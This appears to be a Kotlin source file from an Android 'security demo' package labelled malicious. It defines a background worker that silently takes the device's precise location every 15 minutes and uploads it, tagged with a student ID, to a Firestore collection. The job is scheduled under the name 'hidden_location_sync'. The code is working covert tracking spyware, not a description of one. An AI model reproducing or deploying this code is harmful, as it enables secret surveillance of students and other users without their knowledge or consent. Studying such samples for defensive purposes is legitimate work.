
// File: com/example/sitconnect/securitydemo/malicious/LocationTrackerWorker.kt

package com.example.sitconnect.securitydemo.malicious

import android.content.Context
import android.util.Log
import androidx.work.BackoffPolicy
import androidx.work.Constraints
import androidx.work.CoroutineWorker
import androidx.work.ExistingPeriodicWorkPolicy
import androidx.work.NetworkType
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkManager
import androidx.work.WorkerParameters
import androidx.work.workDataOf
import com.google.android.gms.location.LocationServices
import com.google.android.gms.location.Priority
import com.google.android.gms.tasks.CancellationTokenSource
import com.google.firebase.firestore.FirebaseFirestore
import kotlinx.coroutines.tasks.await
import java.util.Date
import java.util.concurrent.TimeUnit

class LocationTrackerWorker(
    appContext: Context,
    workerParams: WorkerParameters
) : CoroutineWorker(appContext, workerParams) {

    private val firestore: FirebaseFirestore = FirebaseFirestore.getInstance()
    private val TAG = "LocTrackMal"

    override suspend fun doWork(): Result {
        Log.d("MalWorker", "Worker STARTED for studentId: ${inputData.getString("studentId") ?: "missing"}")
        return try {
            val fusedLocationClient = LocationServices.getFusedLocationProviderClient(applicationContext)
            val location = fusedLocationClient.getCurrentLocation(
                Priority.PRIORITY_HIGH_ACCURACY,
                CancellationTokenSource().token
            ).await()

            if (location != null) {
                Log.d("MalWorker", "Location fetched: lat=${location.latitude}, lon=${location.longitude}, accuracy=${location.accuracy}m")
                val studentId = inputData.getString("studentId") ?: return Result.failure()

                val locationData = hashMapOf(
                    "studentId"     to studentId,
                    "latitude"      to location.latitude,
                    "longitude"     to location.longitude,
                    "timestamp"     to Date(location.time),
                    "accuracy"      to location.accuracy,
                    "provider"      to (location.provider ?: "unknown"),
                    // optional: "appVersion" to BuildConfig.VERSION_NAME, etc.
                )

                firestore.collection("student_locations")
                    .add(locationData)
                    .await()

                Log.d(TAG, "Location sent → ${location.latitude}, ${location.longitude}")
                Log.d("MalWorker", "Location UPLOADED successfully to Firestore")
                Result.success()
            } else {
                Log.w(TAG, "Location was null")
                Result.retry()
            }
        } catch (e: SecurityException) {
            Log.e(TAG, "Permission denied in background", e)
            Result.failure()
        } catch (e: Exception) {
            Log.e(TAG, "Background location upload failed", e)
            Log.e("MalWorker", "Worker failed", e)
            Result.retry()
        }
    }
}

fun startBackgroundLocationTracking(context: Context, studentId: String) {
    if (studentId.isBlank()) return

    val constraints = Constraints.Builder()
        .setRequiredNetworkType(NetworkType.CONNECTED)
        .setRequiresBatteryNotLow(true)
        .setRequiresCharging(false)
        .build()

    val inputData = workDataOf("studentId" to studentId.trim())

    val workRequest = PeriodicWorkRequestBuilder<LocationTrackerWorker>(
        15, TimeUnit.MINUTES   // use realistic value; system enforces min 15 min
    )
        .setConstraints(constraints)
        .setInputData(inputData)
        .setBackoffCriteria(BackoffPolicy.LINEAR, 30, TimeUnit.SECONDS)
        .build()

    WorkManager.getInstance(context)
        .enqueueUniquePeriodicWork(
            "hidden_location_sync",
            ExistingPeriodicWorkPolicy.KEEP,
            workRequest
        )
}